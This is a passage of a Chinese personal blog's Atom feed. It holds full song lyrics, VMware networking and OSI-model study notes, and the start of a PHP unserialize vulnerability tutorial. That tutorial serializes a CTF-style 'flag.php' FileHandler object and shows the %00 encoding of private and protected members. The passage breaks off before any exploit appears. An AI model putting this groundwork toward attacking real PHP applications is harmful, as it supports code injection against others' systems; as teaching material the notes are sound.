src="https://i.loli.net/2021/10/15/Ubm6uEakfOZnTV3.png" alt="image-20211015165608348"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>呓语</title>
    <link href="https://xizhi-future.github.io/2021/10/10/%E5%91%93%E8%AF%AD/"/>
    <id>https://xizhi-future.github.io/2021/10/10/%E5%91%93%E8%AF%AD/</id>
    <published>2021-10-10T08:46:24.000Z</published>
    <updated>2021-10-10T09:07:35.393Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 毛不易</p><p>作曲 : 毛不易</p><p>一段未醒</p><p>又做一段</p><p>如果这画面有开关</p><p>从期待走到不堪</p><p>结局不好看</p><p>人总需要记住遗憾</p><p>它来过 它走了</p><p>没回头 没问过</p><p>你可舍得</p><p>日月蹉跎</p><p>小起大落</p><p>光阴里有多少景色</p><p>偶尔也心口一热</p><p>什么都不说</p><p>好过亲手把它撕破</p><p>路还长 梦还多</p><p>被这话 欺骗的</p><p>何止你我</p><p>可是我现在依然不太会转弯</p><p>虽然孤单的人偶尔也想有个伴</p><p>冷风又吹的时候想说</p><p>这生活会不会有点难</p><p>难道是因为当初有话没讲完</p><p>堵在喉咙里却始终不敢大声喊</p><p>算了 别哭</p><p>日月蹉跎</p><p>小起大落</p><p>光阴里有多少景色</p><p>偶尔也心口一热</p><p>什么都不说</p><p>好过亲手把它撕破</p><p>路还长 梦还多（不多）</p><p>被这话 欺骗的</p><p>何止你我</p><p>可是我现在依然不太会转弯</p><p>虽然孤单的人偶尔也想有个伴</p><p>冷风又吹的时候想说</p><p>这生活会不会有点难</p><p>难道是因为当初有话没讲完</p><p>堵在喉咙里却始终不敢大声喊</p><p>算了 别哭</p><p>可是我偏偏就是不想要转弯</p><p>就算不开灯的房间真的有些暗</p><p>夜色又来的时候想说</p><p>为什么只留给我一半</p><p>难道是因为出现的人都伪善</p><p>擅长告别擅长躲闪擅长分两端</p><p>算了 别哭</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>保留</title>
    <link href="https://xizhi-future.github.io/2021/10/10/%E4%BF%9D%E7%95%99/"/>
    <id>https://xizhi-future.github.io/2021/10/10/%E4%BF%9D%E7%95%99/</id>
    <published>2021-10-10T08:44:00.000Z</published>
    <updated>2021-10-10T08:45:51.039Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 郭顶</p><p>作曲 : 郭顶</p><p>看见 你在我眼前</p><p>不去猜想我们隔多远</p><p>当我 夜幕中准备</p><p>只想让沉默的能开解</p><p>在不同的遭遇里我发现你的瞬间</p><p>有种不可言说的温柔直觉</p><p>在有限的深夜消失之前触摸你的脸</p><p>我情愿这是幻觉 也不愿是种告别</p><p>已经忘了 你的名字</p><p>就在这座 寂静星石</p><p>怎么还有 你的样子</p><p>被保留</p><p>给我 一整个拥抱</p><p>好让我不至于 太潦倒</p><p>时间 过一分一秒</p><p>还是觉得相遇 太美好</p><p>在不同的遭遇里我发现你的瞬间</p><p>有种不可言说的温柔直觉</p><p>当不远的蓝色渐渐显现这无边境界</p><p>我始终等待再见 只不愿再也不见</p><p>已经忘了 你的名字</p><p>就在这座 寂静星石</p><p>怎么还有 你的样子</p><p>想形容你的句子 关于你所有心事</p><p>一眼能及的钻石 哪一个是你地址</p><p>忘了 你的名字</p><p>就在这座 寂静星石</p><p>怎么还有 你的样子</p><p>我始终等待再见 只不愿再也不见</p><p>真的忘了 你的名字</p><p>是在哪座 寂静星石</p><p>一直还有 你的样子</p><p>被保留</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>雨天心事</title>
    <link href="https://xizhi-future.github.io/2021/10/09/%E9%9B%A8%E5%A4%A9%E5%BF%83%E4%BA%8B/"/>
    <id>https://xizhi-future.github.io/2021/10/09/%E9%9B%A8%E5%A4%A9%E5%BF%83%E4%BA%8B/</id>
    <published>2021-10-09T03:36:22.000Z</published>
    <updated>2021-10-09T04:17:23.453Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="94ca14958087636ac0d05246e2f08cdc77fbac705e80a44b4b290d7e348a4393"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">只给知心的人分享，请在输入密码方可阅读！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read</summary>
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>虚拟机的网络设置</title>
    <link href="https://xizhi-future.github.io/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"/>
    <id>https://xizhi-future.github.io/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</id>
    <published>2021-10-08T13:12:52.000Z</published>
    <updated>2021-10-08T13:13:15.379Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="虚拟机的网络设置"><a href="#虚拟机的网络设置" class="headerlink" title="虚拟机的网络设置"></a>虚拟机的网络设置</h1><p>VMware三种网络设置：Bridged桥接，NET网络地址转换模式，Host-Only仅主机模式</p><p>当下载软件之后，我们的真实机上将会多出一些虚拟网卡，用于 虚拟机网络的配置</p><p><img src="https://i.loli.net/2021/10/08/RIh78Fy2A4GpOVr.png" alt="image-20211008210437678"></p><blockquote><ul><li><strong>VMnet0</strong> ：用于 Bridged 桥接模式</li><li><strong>VMnet8</strong> ：用于 NET 模式</li><li><strong>VMnet1</strong> ：用于 Host-Only 模式</li></ul></blockquote><p><img src="https://i.loli.net/2021/10/08/NnEDgAUpr5cLC4f.png" alt="image-20211008201312486"></p><ul><li><p>可以看到存在 三个 VMnet0   VMnet1  VMnet8</p></li><li><p>这些是 VMware Workstation 软件 自带的，可以进行设置，可以进行删除，它们相当于 是三个交换机。</p></li><li><p><strong>VMnet0</strong> ：如果将一个虚拟机设置为连接在 该交换机上，则相当于 将其 当作一个 真实的物理机 一样连接在你 真实机的所处的网段 当中。</p></li></ul><blockquote><p><strong>测试：设置 Windows 7 接在 VMnet0 上</strong></p></blockquote><p><img src="https://i.loli.net/2021/10/08/3U4jLEX6GvbKNgr.png" alt="image-20211008201924965"></p><p>我们设置为 自动获得 IP 地址，然后查看其网络连接的详细信息，可以看到与我们真实的物理机所处的网段相同。</p><p><img src="https://i.loli.net/2021/10/08/zReG8n63lvoM7Ni.png" alt="image-20211008202237411"></p><blockquote><p>使用 真实机 ping 192.168.4.234</p><p>实际上，只要是处于该网段中的任意一台计算机都可以 ping 通 我们所设置的 虚拟机</p></blockquote><p>当中可能出现的错误：解决办法 （注意：需要使用 管理员方式运行；关闭要ping 的主机的防火墙）</p><p><img src="https://i.loli.net/2021/10/08/vJOUVGj97s4ip6F.png" alt="image-20211008203642130"></p><p><img src="https://i.loli.net/2021/10/08/3unJasAW6EZprLj.png" alt="image-20211008204622495"></p><ul><li>当不需要与外网进行通信，也就是平时我们 仅仅搭建一个小型局域网的 测试，只需要我们的几个虚拟机之间进行通信，我们就不用使用 VMnet0 ，可以使用 其他的交换机或者是 使用 Host-Only</li><li>**NET **：通过真实机 上网，存在一个地址转换，只要是真实机所能访问的所有网络，虚拟机均可</li><li><strong>Host-Only</strong> ：仅主句模式，仅仅能与 真实机 进行通信</li></ul><blockquote><p><strong>补充：</strong></p><p><strong>169.254.X.X</strong></p><p>是Windows操作系统在DHCP信息租用失败时自动给客户机分配的IP地址。但是是无法与网关通信的，也无法接入Internet的情况。</p></blockquote><p><a href="https://www.cnblogs.com/cnjavahome/p/11266931.html">虚拟机网络设置 参考</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="虚拟机" scheme="https://xizhi-future.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>1.7 计算机网络的体系结构</title>
    <link href="https://xizhi-future.github.io/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <id>https://xizhi-future.github.io/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</id>
    <published>2021-10-08T12:01:19.000Z</published>
    <updated>2021-10-08T12:02:38.238Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-7-计算机网络的体系结构"><a href="#1-7-计算机网络的体系结构" class="headerlink" title="1.7 计算机网络的体系结构"></a>1.7 计算机网络的体系结构</h1><ul><li>ISO 国际标准化组织</li><li>OSI / RM  互连网法律上的国际标准</li><li>TCP / IP 因特网事实上的国际标准</li><li>网络协议  Network Protocols   数据交换存寿的规则、标准与约定</li><li>网络体系结构  计算机网络各层及其协议的集合</li></ul><h2 id="1-7-1-OSI-七层模型"><a href="#1-7-1-OSI-七层模型" class="headerlink" title="1.7.1 OSI 七层模型"></a>1.7.1 OSI 七层模型</h2><p><strong>开放式系统互联通信参考模型</strong>（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为  <em>OSI模型</em>（OSI model），一种 <em>概念模型</em>，由 <em>国际标准化组织</em> 提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。</p><p><strong>应用层</strong>：可以产生流量，可以与用户进行交互的应用程序</p><p><strong>表示层</strong>：是否加密？ 是否压缩？  编码问题？  开发人员需要考虑的问题</p><p><strong>会话层</strong>：服务端与客户端建立的会话   可查看木马：<code>netstat -nb </code></p><p>​    例如：远程桌面建立会话</p><blockquote><p>192.168.158.1   远程连接    192.168.158.115</p></blockquote><ul><li><p>对 192.168.158.115 进行端口查看，可以看到 存在远程桌面的会话</p><p><code>netstat -an</code></p></li></ul><p><img src="https://i.loli.net/2021/10/07/hFeXnqdbw1MSTNI.png" alt="image-20211007175448711"></p><ul><li><p>进一步 进行 “木马” 查看：</p><p><code>netstat -nb</code></p></li></ul><p><img src="https://i.loli.net/2021/10/07/eYxl8Gr1UKgtuho.png" alt="image-20211007175644564"></p><p>例：当想查看当前计算机中是否存在木马，可以打开电脑，不进行任何操作，即无流量传输，后 命令 <code>netstat -nb</code>  ，查看进程。</p><p><strong>传输层：</strong>可靠传输（建立会话），不可靠传输（不建立会话），流量控制</p><p><strong>网络层：</strong>IP地址编址，选择最佳路径（动态路由协议）</p><p><strong>数据链路层：</strong>规定数据如何封装，添加物理层地址（MAC 地址）</p><p><strong>物理层：</strong>电压、接口标准</p><blockquote><p><strong>应用举例：</strong></p><p>​    <strong>网络排错</strong>：分层检查：从最底层开始向上逐一排查</p><pre><code>1. 网线是否插好？（物理层）2.  IP地址 检查 （网络层）3. 浏览器 恶意插件？（应用层）</code></pre><p>终极：重装，重启，格式化</p></blockquote><blockquote><p><strong>网络安全与 OSI 参考模型</strong></p><ol><li>物理层安全     设置 <em>交换机</em> 某接口禁止 外来用户 的连接</li><li>数据链路层安全   ADSL、AP密码</li><li>网络层安全    设置 <em>路由器</em> 某接口 禁止外来用户 的连接</li><li>应用层安全      SQL注入、文件上传、文件包含等等 应用层漏洞、各种攻击手段等</li></ol></blockquote><h2 id="1-7-2-TCP-IP-四层模型"><a href="#1-7-2-TCP-IP-四层模型" class="headerlink" title="1.7.2 TCP/IP 四层模型"></a>1.7.2 TCP/IP 四层模型</h2><p><strong>应用层</strong>   （包括了 表示层、会话层）</p><p><strong>传输层</strong></p><p><strong>网络层</strong></p><p>**网络接口层 **  （包括了 数据链路层、物理层）</p><h2 id="1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程"><a href="#1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程" class="headerlink" title="1.7.3 五层协议  对应 数据单元  以及 数据简单 运输过程"></a>1.7.3 五层协议  对应 <code>数据单元</code>  以及 <code>数据简单 运输过程</code></h2><p><strong>应用层</strong>             传输数据单元：PDU</p><p>**传输层    **         运输层 报文   <code>加 TCP/UDP</code></p><p><strong>网络层</strong>             IP 数据包 （IP 分组）  <code>加 IP 地址</code></p><p><strong>数据链路层</strong>      数据帧   <code>加 MAC 地址，加帧头帧尾 </code> </p><p><strong>物理层</strong>              比特流  bit  (01构成)    </p><p><img src="https://i.loli.net/2021/10/08/h5k2MJC7V6KS3wb.png" alt="image-20211008194422314"></p><p> <img src="https://i.loli.net/2021/10/08/bfYMdNl1crxivny.png" alt="image-20211008194507335"></p><h2 id="1-7-4-基本概念"><a href="#1-7-4-基本概念" class="headerlink" title="1.7.4 基本概念"></a>1.7.4 基本概念</h2><p><strong>实体 entity</strong> ：交换信息或软件进程</p><p><strong>协议 protocol</strong> ：控制两个对等实体通信的规则</p><p><strong>服务 service</strong> ：下层向上层提供服务，上层需要使用下层提供的服务来实现本层的功能</p><p><strong>服务访问点 SAP</strong> ：相邻两层实体之间交换信息的地方</p><p><img src="https://i.loli.net/2021/10/08/RexqQ58rS27CJ19.png" alt="image-20211008193707527"></p><h2 id="1-7-5-实操"><a href="#1-7-5-实操" class="headerlink" title="1.7.5 实操"></a>1.7.5 实操</h2><p><strong>查看本地网络连接网速：</strong></p><blockquote><p>测试：windows 7 </p></blockquote><p><img src="https://i.loli.net/2021/10/08/EOCmnvh81937pGQ.png" alt="image-20211008195814866"></p><p>自动协商是根据双方速率进行自动设置，如果强制设置为与另一方速率不匹配的网速，则无法正常进行通信。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>序列化与反序列化</title>
    <link href="https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-10-07T10:10:26.000Z</published>
    <updated>2021-10-07T10:11:19.031Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><blockquote><p>序列化：持久保存，网络传输</p><p>序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据</p><p>本质上就是对于数据格式的一种转换</p></blockquote><p><strong>常见的序列化格式：</strong></p><ul><li>二进制格式</li><li>字节数组</li><li>json 字符串</li><li>xml 字符串</li></ul><p><img src="https://i.loli.net/2021/09/15/IWPycor6sQ9nYL7.png" alt="image-20210504114814092"></p><p>理解：在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此<strong>PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</strong></p><h1 id="一、-PHP-反序列化"><a href="#一、-PHP-反序列化" class="headerlink" title="一、 PHP 反序列化"></a>一、 PHP 反序列化</h1><h2 id="1-1-格式"><a href="#1-1-格式" class="headerlink" title="1.1 格式"></a>1.1 格式</h2><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码注入，SQL注入等危害。</p><p>当进行反序列化的过程中就会自动触发某些魔术方法。</p><p><strong>涉及函数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()<span class="comment">//序列化：将一个对象转换为一个字符串</span></span><br><span class="line">unserialize()<span class="comment">//反序列化：将一个字符串还原为一个对象</span></span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;qww&quot;</span>;</span><br><span class="line"><span class="comment">//$test = 123;</span></span><br><span class="line"><span class="comment">//$test = true;</span></span><br><span class="line"><span class="variable">$test</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:3:&quot;qww&quot;;</span></span><br><span class="line"><span class="comment">//i:123;    </span></span><br><span class="line"><span class="comment">//b:1;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;s:3:&quot;qww&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//qww </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$user</span>=array(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">print_r(unserialize(<span class="variable">$user</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/qVYPWyw4pl1ITsJ.png" alt="image-20210910165634478"></p><p><strong>格式：</strong></p><p><img src="https://i.loli.net/2021/09/15/3JxYcWU6D2tlKOn.png" alt="image-20210504120450323"></p><p><strong>序列化与反序列化 字母表示：</strong></p><table><thead><tr><th align="center">a</th><th align="center">array数组</th></tr></thead><tbody><tr><td align="center">b</td><td align="center">boolean判断类型</td></tr><tr><td align="center">d</td><td align="center">double浮点数</td></tr><tr><td align="center">i</td><td align="center">integer整数型</td></tr><tr><td align="center">o</td><td align="center">common object 一般的对象</td></tr><tr><td align="center">r</td><td align="center">reference引用类型</td></tr><tr><td align="center">s</td><td align="center">string字符串类型</td></tr><tr><td align="center">C</td><td align="center">custom object</td></tr><tr><td align="center">O</td><td align="center">class</td></tr><tr><td align="center">N</td><td align="center">null</td></tr><tr><td align="center">R</td><td align="center">pointer reference</td></tr><tr><td align="center">U</td><td align="center">unicode string</td></tr></tbody></table><h2 id="1-2-特性"><a href="#1-2-特性" class="headerlink" title="1.2 特性"></a>1.2 特性</h2><ul><li><p><strong>所有 php 中的值都可以使用 serialize()  来返回一个包含字节流的字符串表示</strong></p></li><li><p><strong>序列化之后的内容只有成员变量，没有成员函数，即方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;<span class="variable">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">happy</span></span>()&#123;<span class="built_in">return</span> <span class="variable">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/NS5xRa8hUD7rvXI.png" alt="image-20210910170119999"></p></li><li><p><strong>三种变量类型的差异：</strong></p><p>变量前是 <strong>protected</strong>，则会在变量名前加上<code>\x00*\x00</code> , <strong>private</strong> 则会在变量名前加上<code>\x00类名\x00</code>，<code>\x00字段名\x00</code>，输出时一般需要url编码，若在本地存储推荐采用base64编码的形式。</p><ul><li><p><strong>public  正常输出</strong></p></li><li><p><strong>Private 所声明的私有变量</strong> 只能在所声明的类中可见，在该类的子类以及该类的对象中均不可见。所以私有变量在序列化时，类名和字段名前面都会加上 <code>%00</code> ，即 ascii 为0的字符（不可见字符）；</p></li><li><p><strong>Protected 所声明受保护类型的变量</strong> 序列化时会有 <code>%00*%00</code> 字符；</p></li></ul><p><strong>测试一：public</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><strong>测试二：private</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;FileHandlerop&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;FileHandlerfilename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;FileHandlercontent&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;%00FileHandler%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;%00FileHandler%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;%00FileHandler%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><strong>测试三：protected</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span 